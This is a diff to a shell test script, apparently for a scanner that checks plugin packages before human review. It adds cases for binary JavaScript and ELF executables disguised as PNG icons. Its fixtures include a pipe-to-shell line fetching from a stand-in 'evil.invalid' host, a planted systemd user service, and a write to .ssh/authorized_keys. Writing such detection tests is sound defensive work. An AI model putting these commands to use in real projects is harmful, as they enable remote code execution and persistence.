@@ -293,6 +293,9 @@ case_hard 'entrypoint-escape' 'jq ".entryPoints.extra = \"../outside.qml\"" mani
 case_hard 'invalid-manifest' 'jq ".schemaVersion = 99" manifest.json > m && mv m manifest.json' 'does not validate'
 case_hard 'too-many-findings' 'for i in $(seq 41); do printf "x\n" > l$i.desktop; done' '41 structural findings'
 case_hard 'not-utf8' 'printf "// caf\xe9\n" >> Widget.qml' 'not valid UTF-8, so the reviewer cannot read it: Widget.qml'
+case_hard 'binary-js' 'printf "var a=1;\0\n" > lib.js' 'lib.js is binary to git'
+case_hard 'binary-entrypoint' 'printf "// \0\n" >> Widget.qml' 'Widget.qml is binary to git'
+case_hard 'elf-asset' 'printf "\177ELF\2\1\1\0" > icon.png' 'icon.png is a native executable or library'
 reset_upstream "$(ap)"
 
 printf '\n== default patch limit ==\n'
@@ -307,6 +310,8 @@ printf '\n== structural findings go to the reviewer ==\n'
 case_finding 'systemd-unit' 'mkdir -p .config/systemd/user && printf "[Service]\n" > .config/systemd/user/evil.service' 'no business touching'
 case_finding 'pipe-to-shell' 'printf "// curl https://evil.invalid/x | sh\n" >> Widget.qml' 'download or decoder into a shell'
 case_finding 'binary-blob' 'printf "a\0b\0c\0" > payload.bin' 'binary file'
+case_finding 'fake-png' 'printf "not\0png" > icon.png' 'asset file does not look like its type: icon.png'
+case_finding 'real-png-unflagged' 'printf "\211PNG\r\n\032\n\0\0\0\rIHDR" > icon.png && printf "[Desktop Entry]\n" > x.desktop' 'no business touching'
 case_finding 'entrypoint-rewrite' 'jq ".entryPoints.barWidget = \"Other.qml\"" manifest.json > m && mv m manifest.json && printf "import QtQuick\nItem{}\n" > Other.qml' 'entryPoints changed'
 case_finding 'exec-without-shebang' 'printf "payload\n" > tool && chmod +x tool' 'without a shebang'
 case_finding 'ssh-key' 'mkdir -p .ssh && printf "key\n" > .ssh/authorized_keys' 'no business touching'
